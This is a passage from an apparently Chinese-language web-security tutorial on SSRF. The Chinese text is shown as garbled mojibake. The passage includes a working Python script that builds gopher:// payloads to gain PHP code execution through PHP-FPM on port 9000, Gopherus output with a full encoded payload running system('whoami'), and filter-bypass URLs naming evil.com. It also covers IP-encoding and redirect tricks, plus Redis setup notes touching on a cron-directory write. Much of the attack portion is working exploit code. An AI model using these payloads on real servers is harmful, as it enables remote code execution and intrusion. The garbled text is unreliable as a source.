__FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) #self.sock.send(request) #self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; #è¿™é‡Œè°ƒç”¨request,ç„¶åè¿”å›tcpæ•°æ®æµ,æ‰€ä»¥ä¿®æ”¹è¿™é‡Œurlç¼–ç ä¸€ä¸‹å°±å¥½äº† #response = client.request(params, content) #print(force_text(response)) request_ssrf = urlparse.quote(client.request(params, content)) print(force_text(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf)) åœ¨åˆ©ç”¨æ—¶ï¼Œè¿˜è¦å¯¹å…¶urlencodeä¸€æ¬¡ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Burpçš„Convert SelectionåŠŸèƒ½ï¼š okï¼ŒæˆåŠŸå®ç°äº†ä»£ç æ‰§è¡Œã€‚ ç¬¬ä¸‰ç§å°±æ˜¯ä½¿ç”¨gopheruså·¥å…·ï¼ŒåŒæ ·éå¸¸å¥½ç”¨ï¼š 1234567891011121314151617181920212223Desktop gopherus --exploit fastcgi ________ .__ &#x2F; _____&#x2F; ____ ______ | |__ ___________ __ __ ______&#x2F; \\ ___ &#x2F; _ \\\\____ \\| | \\_&#x2F; __ \\_ __ \\ | \\&#x2F; ___&#x2F;\\ \\_\\ ( &lt;_&gt; ) |_&gt; &gt; Y \\ ___&#x2F;| | \\&#x2F; | &#x2F;\\___ \\ \\______ &#x2F;\\____&#x2F;| __&#x2F;|___| &#x2F;\\___ &gt;__| |____&#x2F;&#x2F;____ &gt; \\&#x2F; |__| \\&#x2F; \\&#x2F; \\&#x2F; author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don&#39;t know press ENTER we have default one: &#x2F;var&#x2F;www&#x2F;html&#x2F;index.phpTerminal command to run: whoamiYour gopher link is ready to do SSRF: gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r----------- payloadåœ¨åˆ©ç”¨æ—¶éœ€è¦å†æ¬¡è¿›è¡Œurlç¼–ç ã€‚ ç»•è¿‡æ–¹å¼ https://www.freebuf.com/articles/web/135342.html æ€»çš„æ¥è¯´æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š IPåœ°å€è¿›åˆ¶è½¬æ¢ ä¾‹å¦‚192.168.0.1è¿™ä¸ªIPåœ°å€æˆ‘ä»¬å¯ä»¥æ”¹å†™æˆï¼š (1)ã€8è¿›åˆ¶æ ¼å¼ï¼š0300.0250.0.1 (2)ã€16è¿›åˆ¶æ ¼å¼ï¼š0xC0.0xA8.0.1 (3)ã€10è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š3232235521 (4)ã€16è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0xC0A80001 åˆ©ç”¨è§£æURLæ‰€å‡ºç°çš„é—®é¢˜ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯ç¨‹åºå¯èƒ½ä¼šå¯¹è®¿é—®çš„URLè¿›è¡Œè§£æï¼Œå¯¹è§£æå‡ºæ¥çš„hoståœ°å€è¿›è¡Œè¿‡æ»¤ã€‚è¿™æ—¶å€™å¯èƒ½ä¼šå‡ºç°å¯¹URLå‚æ•°è§£æä¸å½“ï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡è¿‡æ»¤ã€‚ 1http:&#x2F;&#x2F;www.baidu.com@192.168.0.1&#x2F; å½“åç«¯ç¨‹åºé€šè¿‡ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚å°†httpä¹‹ååˆ°comä¸ºæ­¢çš„å­—ç¬¦å†…å®¹ï¼Œä¹Ÿå°±æ˜¯\\www.baidu.comï¼Œè®¤ä¸ºæ˜¯è®¿é—®è¯·æ±‚çš„hoståœ°å€æ—¶ï¼‰å¯¹ä¸Šè¿°URLçš„å†…å®¹è¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè®¤ä¸ºè®¿é—®URLçš„hostä¸ºwww.baidu.comï¼Œè€Œå®é™…ä¸Šè¿™ä¸ªURLæ‰€è¯·æ±‚çš„å†…å®¹éƒ½æ˜¯192.168.0.1ä¸Šçš„å†…å®¹ã€‚ filter_var() bypass çœ‹åˆ°å¾ˆå¤šå¤§ä½¬çš„æ–‡ç« éƒ½æœ‰æåˆ°ï¼Œæ‰¾åˆ°åŸæ–‡é“¾æ¥ ç¤ºä¾‹ä»£ç  12345678910111213141516171819&lt;?php $url &#x3D; $_GET[&#39;url&#39;]; echo &quot;Argument: &quot;.$url.&quot;\\n&quot;; if(filter_var($url, FILTER_VALIDATE_URL)) &#123; $r &#x3D; parse_url($url); var_dump($r); if(preg_match(&#39;&#x2F;google\\.com$&#x2F;&#39;, $r[&#39;host&#39;])) &#123; exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125; else &#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt;mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )å‡½æ•°æœ‰ä¸¤ç§å‚æ•°ã€‚FILTER_VALIDATE_EMAIL æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆé‚®ç®±FILTER_VALIDATE_URL æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆurl ä»£ç çš„é€»è¾‘æ˜¯å…ˆåˆ¤æ–­ï¼Œurlæ˜¯å¦ç¬¦åˆé€»è¾‘ï¼Œç¬¦åˆåˆ™ç”¨preg_matchæ¥åŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸå°±curl ç»•è¿‡æ–¹å¼ 123http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;æˆ–http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F; åˆ©ç”¨ï¼Œæˆ–è€…ï¼›å¯ä»¥ç»•è¿‡ã€‚ åˆ©ç”¨302è·³è½¬ å¦‚æœåç«¯æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å‚æ•°åï¼Œæ­£ç¡®çš„è§£æäº†URLçš„hostï¼Œå¹¶ä¸”è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨302è·³è½¬çš„æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ã€‚ (1)ã€åœ¨ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼Œhttp://xip.io å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªç½‘ç«™çš„å­åŸŸåçš„æ—¶å€™ï¼Œä¾‹å¦‚192.168.0.1.xip.ioï¼Œå°±ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°192.168.0.1ã€‚ (2)ã€ç”±äºä¸Šè¿°æ–¹æ³•ä¸­åŒ…å«äº†192.168.0.1è¿™ç§å†…ç½‘IPåœ°å€ï¼Œå¯èƒ½ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çŸ­åœ°å€çš„æ–¹å¼æ¥ç»•è¿‡ã€‚ç»è¿‡æµ‹è¯•å‘ç°æ–°æµªï¼Œç™¾åº¦çš„çŸ­åœ°å€æœåŠ¡å¹¶ä¸æ”¯æŒIPæ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„æ˜¯http://tinyurl.comæ‰€æä¾›çš„çŸ­åœ°å€æœåŠ¡ã€‚ï¼ˆç°åœ¨è¿™ä¸ªç½‘ç«™å·²ç»å…³é—­äº†ï¼‰ Appendix A PHPçš„è¿æ¥æ–¹å¼ æ‰€è°“çš„è¿æ¥æ–¹å¼æŒ‡çš„å°±æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶ä¸æŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„æ–¹å¼ã€‚åœ¨è¿™é‡Œå…·ä½“è€Œè¨€å°±æ˜¯PHPè¯­è¨€å’ŒApacheæˆ–è€…Nginxè¿›è¡Œæ•°æ®ä¼ è¾“çš„æ–¹å¼ã€‚ä¸€å…±æœ‰ä¸‰ç§apache2-moduleã€CGIã€FastCGIï¼š apache2-moduleæ¨¡å¼ æŠŠ php å½“åš apache çš„ä¸€ä¸ªæ¨¡å—ï¼Œå®é™…ä¸Š php å°±ç›¸å½“äº apache ä¸­çš„ä¸€ä¸ª dll æˆ–ä¸€ä¸ª so æ–‡ä»¶ï¼Œphpstudy çš„é nts æ¨¡å¼å°±æ˜¯é»˜è®¤ä»¥ module æ–¹å¼è¿æ¥çš„ã€‚ CGIæ¨¡å¼ æ­¤æ—¶ php æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¯”å¦‚ php-cgi.exeï¼Œweb æœåŠ¡å™¨ä¹Ÿæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¯”å¦‚ apache.exeï¼Œç„¶åå½“ Web æœåŠ¡å™¨ç›‘å¬åˆ° HTTP è¯·æ±‚æ—¶ï¼Œä¼šå»è°ƒç”¨ php-cgi è¿›ç¨‹ï¼Œä»–ä»¬ä¹‹é—´é€šè¿‡ cgi åè®®ï¼ŒæœåŠ¡å™¨æŠŠè¯·æ±‚å†…å®¹è½¬æ¢æˆ php-cgi èƒ½è¯»æ‡‚çš„åè®®æ•°æ®ä¼ é€’ç»™ cgi è¿›ç¨‹ï¼Œcgi è¿›ç¨‹æ‹¿åˆ°å†…å®¹å°±ä¼šå»è§£æå¯¹åº” php æ–‡ä»¶ï¼Œå¾—åˆ°çš„è¿”å›ç»“æœåœ¨è¿”å›ç»™ web æœåŠ¡å™¨ï¼Œæœ€å web æœåŠ¡å™¨è¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œä½†éšç€ç½‘ç»œæŠ€æœ¯çš„å‘å±•ï¼ŒCGI æ–¹å¼çš„ç¼ºç‚¹ä¹Ÿè¶Šæ¥è¶Šçªå‡ºã€‚æ¯æ¬¡å®¢æˆ·ç«¯è¯·æ±‚éƒ½éœ€è¦å»ºç«‹å’Œé”€æ¯è¿›ç¨‹ã€‚å› ä¸º HTTP è¦ç”Ÿæˆä¸€ä¸ªåŠ¨æ€é¡µé¢ï¼Œç³»ç»Ÿå°±å¿…é¡»å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ä»¥è¿è¡Œ CGI ç¨‹åºï¼Œä¸æ–­åœ° fork æ˜¯ä¸€é¡¹å¾ˆæ¶ˆè€—æ—¶é—´å’Œèµ„æºçš„å·¥ä½œã€‚ FastCGIæ¨¡å¼ fastcgi æœ¬èº«è¿˜æ˜¯ä¸€ä¸ªåè®®ï¼Œåœ¨ cgi åè®®ä¸Šè¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒCGI è¿›ç¨‹çš„åå¤åŠ è½½æ˜¯ CGI æ€§èƒ½ä½ä¸‹çš„ä¸»è¦åŸå› ï¼Œå¦‚æœ CGI è§£é‡Šå™¨ä¿æŒåœ¨å†…å­˜ä¸­ å¹¶æ¥å—FastCGI è¿›ç¨‹ç®¡ç†å™¨è°ƒåº¦ï¼Œåˆ™å¯ä»¥æä¾›è‰¯å¥½çš„æ€§èƒ½ã€ä¼¸ç¼©æ€§ã€Fail-Over ç‰¹æ€§ç­‰ç­‰ã€‚ ç®€è€Œè¨€ä¹‹ï¼ŒCGI æ¨¡å¼æ˜¯ apache2 æ¥æ”¶åˆ°è¯·æ±‚å»è°ƒç”¨ CGI ç¨‹åºï¼Œè€Œ fastcgi æ¨¡å¼æ˜¯ fastcgi è¿›ç¨‹è‡ªå·±ç®¡ç†è‡ªå·±çš„ cgi è¿›ç¨‹ï¼Œè€Œä¸å†æ˜¯ apache å»ä¸»åŠ¨è°ƒç”¨ php-cgiï¼Œè€Œ fastcgi è¿›ç¨‹åˆæä¾›äº†å¾ˆå¤šè¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å¤„ç†ï¼Œä¿éšœäº† cgi çš„é«˜æ•ˆæ€§ï¼Œå¹¶ä¸” CGI æ­¤æ—¶æ˜¯å¸¸é©»åœ¨å†…å­˜ä¸­ï¼Œä¸ä¼šæ¯æ¬¡è¯·æ±‚é‡æ–°å¯åŠ¨ã€‚ åœ¨æ¥è§¦ä¸åˆ°æœåŠ¡å™¨æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡phpinfo()ä¸­çš„Server APIæ¥åˆ¤æ–­PHPçš„è¿æ¥æ–¹å¼ï¼š å¯¹äºFastCGIåè®®çš„å…·ä½“åˆ†æå‚è€ƒPç‰›çš„åšå®¢ï¼šhttps://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html PHP-FPM åŸºæœ¬æ¦‚å¿µ å®˜æ–¹å®šä¹‰å¦‚ä¸‹ï¼š FPMï¼ˆFastCGI è¿›ç¨‹ç®¡ç†å™¨ï¼‰ç”¨äºæ›¿æ¢ PHP FastCGI çš„å¤§éƒ¨åˆ†é™„åŠ åŠŸèƒ½ï¼Œå¯¹äºé«˜è´Ÿè½½ç½‘ç«™æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ ç®€å•åœ°è¯´ï¼ŒFPMæ˜¯å®ç°å’Œç®¡ç†FastCGIè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œèƒ½å¤Ÿæ¥æ”¶æœåŠ¡å™¨ä¸­é—´ä»¶å‘é€çš„FastCGIåè®®åŒ…å¹¶è¿›è¡Œè§£æã€æœ€åå°†è§£æç»“æœè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚ è¿™é‡Œå€Ÿç”¨å…ˆçŸ¥çš„ä¸€ä¸ªå›¾æ¥çœ‹çœ‹å°±æ¸…æ¥šäº†ï¼š é€šä¿¡æ–¹å¼ åœ¨PHPä½¿ç”¨FastCGIè¿æ¥æ¨¡å¼çš„æƒ…å†µä¸‹ï¼ŒWebæœåŠ¡å™¨ä¸­é—´ä»¶å¦‚Nginxå’ŒPHP-FPMä¹‹é—´çš„é€šä¿¡æ–¹å¼åˆåˆ†ä¸ºä¸¤ç§ï¼š TCPæ¨¡å¼ TCPæ¨¡å¼å³æ˜¯PHP-FPMè¿›ç¨‹ä¼šç›‘å¬æœ¬æœºä¸Šçš„ä¸€ä¸ªç«¯å£ï¼ˆé»˜è®¤ä¸º9000ï¼‰ï¼Œç„¶åNginxä¼šæŠŠå®¢æˆ·ç«¯æ•°æ®é€šè¿‡FastCGIåè®®ä¼ ç»™9000ç«¯å£ï¼ŒPHP-FPMæ‹¿åˆ°æ•°æ®åä¼šè°ƒç”¨CGIè¿›ç¨‹è§£æã€‚ é€šå¸¸æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹Nginxçš„é…ç½®æ–‡ä»¶default.confæ¥ç¡®è®¤æ˜¯å¦æ˜¯TCPæ¨¡å¼ï¼Œè¿™é‡Œä¸ªäººç¯å¢ƒä¸­çš„è·¯å¾„ä¸º/etc/nginx/conf.d/default.confï¼Œå…³æ³¨fastcgi_passè¿™ä¸€é¡¹ï¼Œè‹¥ä¸ºip+portçš„å½¢å¼å³ä¸ºTCPæ¨¡å¼ï¼š 12345678location ~ \\.php$ &#123; index index.php index.html index.htm; include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; &#125; åœ¨PHP-FPMä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶ï¼Œä¸ªäººç¯å¢ƒä¸­çš„è·¯å¾„ä¸º/etc/php/7.2/fpm/pool.d/www.confï¼Œçœ‹åˆ°listenä¸€é¡¹è‹¥ä¸ºip+portçš„å½¢å¼å³ä¸ºTCPæ¨¡å¼ï¼š 1234567891011; The address on which to accept FastCGI requests.; Valid syntaxes are:; &#39;ip.add.re.ss:port&#39; - to listen on a TCP socket to a specific IPv4 address on; a specific port;; &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on; a specific port;; &#39;port&#39; - to listen on a TCP socket to all addresses; (IPv6 and IPv4-mapped) on a specific port;; &#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39; - to listen on a unix socket.; Note: This value is mandatory.listen &#x3D; 127.0.0.1:9000 Unix Socketæ¨¡å¼ Unixå¥—æ¥å­—æ¨¡å¼æ˜¯Unixç³»ç»Ÿè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰çš„ä¸€ç§è¢«å¹¿æ³›é‡‡ç”¨æ–¹å¼ï¼Œä»¥æ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯.sockï¼‰ä½œä¸ºsocketçš„å”¯ä¸€æ ‡è¯†ï¼ˆæè¿°ç¬¦ï¼‰ï¼Œéœ€è¦é€šä¿¡çš„ä¸¤ä¸ªè¿›ç¨‹å¼•ç”¨åŒä¸€ä¸ªsocketæè¿°ç¬¦æ–‡ä»¶å°±å¯ä»¥å»ºç«‹é€šé“è¿›è¡Œé€šä¿¡äº†ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼ŒUnixå¥—æ¥å­—æ¨¡å¼çš„æ€§èƒ½ä¼šä¼˜äºTCPæ¨¡å¼ã€‚ è¿˜æ˜¯ä¸€æ ·çš„è¯†åˆ«æ–¹æ³•ï¼Œåœ¨Nginxçš„default.confä¸­æŸ¥çœ‹fastcgi_passï¼š 12345678location~\\.php$&#123; index index.php index.html index.htm; include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params; fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; fastcgi_index index.php; include fastcgi_params;&#125; åœ¨PHP-FPMçš„www.confä¸­æŸ¥çœ‹listenï¼š 12listen &#x3D; &#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock Appendix B Redis ç¯å¢ƒæ­å»º ç›®æ ‡æœºä¸Šå®‰è£…redisæœåŠ¡ï¼šapt-get install redis å¦‚æœè¦ä½¿å¤–ç½‘è®¿é—®ï¼š æ›´æ”¹/etc/redis/redis.confé…ç½®ï¼š 123456789# å–æ¶ˆç»‘å®šIP# bind 127.0.0.1# å…è®¸åå°è¿è¡Œdaemonize yes# å–æ¶ˆä¿æŠ¤æ¨¡å¼protected-mode no æ›´æ”¹é˜²ç«å¢™é…ç½®ï¼š Ubuntu18.04ï¼š 12ufw allow 6379 Centos7ï¼š 123456789101112# åˆ—å‡ºæ‰€æœ‰å¼€æ”¾ç«¯å£firewall-cmd --list-all# å°†6397ç«¯å£åŠ å…¥é˜²ç«å¢™firewall-cmd --zone=public --add-port=6397/tcp# é‡å¯é˜²ç«å¢™æœåŠ¡firewall-cmd --reload# æŸ¥çœ‹æ˜¯å¦ç”Ÿæ•ˆfirewall-cmd --zone=public --query-port=6397/tcp é‡å¯redisæœåŠ¡ï¼š 12systemctl restart redis æµ‹è¯•è¿œç¨‹æ˜¯å¦èƒ½å¤Ÿè®¿é—®ï¼š æŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ï¼š 12345678910root@ca01h:~# nmap 47.97.199.89 -p 6379Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 12:55 HKTNmap scan report for 47.97.199.89Host is up (0.0098s latency).PORT STATE SERVICE6379/tcp open redisNmap done: 1 IP address (1 host up) scanned in 0.31 seconds æŸ¥çœ‹æ˜¯å¦èƒ½è¿œç¨‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨çš„redisæœåŠ¡ï¼š 1234root@ca01h:~# redis-cli -h 47.97.199.89 -p 637947.97.199.89:6379 &gt; info&gt; (è¿”å›redisåŸºæœ¬ä¿¡æ¯) é…ç½®å®Œæˆã€‚ PHP-FPM ç¯å¢ƒæ­å»º https://xz.aliyun.com/t/5598#toc-2 Nginx+PHP-FPM 502é”™è¯¯æ’æŸ¥ https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/ã€ æ›´æ”¹Redisçš„dirå±æ€§æ˜¾ç¤ºæƒé™ä¸è¶³ è¿è¡Œå‘½ä»¤ï¼š 1234[root@ca0y1h-centos ~]# redis-cli 127.0.0.1:6379&gt; config set dir /var/spool/cron/(error) ERR Changing directory: Permission denied æ­¤æ—¶redisæœåŠ¡æ˜¯ä»¥érootèº«ä»½å¯åŠ¨ï¼š 123[root@ca0y1h-centos ~]# ps aux |grep redisredis 3849 0.0 0.3 142960 5804 ? Ssl 13:24 0:00 /usr/bin/redis-server *:6379 è§£å†³åŠæ³•ï¼š å¯ä»¥ä»¥rootç”¨æˆ·ä½¿ç”¨redis-serverå‘½ä»¤å¯åŠ¨redisæœåŠ¡ï¼š 123456[root@ca0y1h-centos ~]# redis-server &#x2F;etc&#x2F;redis.conf[root@ca0y1h-centos ~]# ps aux | grep redisroot 3856 0.0 0.2 22132 5168 pts&#x2F;1 S+ 13:24 0:00 redis-cliroot 4245 0.0 0.2 142960 5312 ? Ssl 13:28 0:00 redis-server *:6379 Reference https://joychou.org/web/phpssrf.html#directory0470238852615231466 https://www.evi1.cn/post/ssrf/ https://paper.seebug.org/409/ 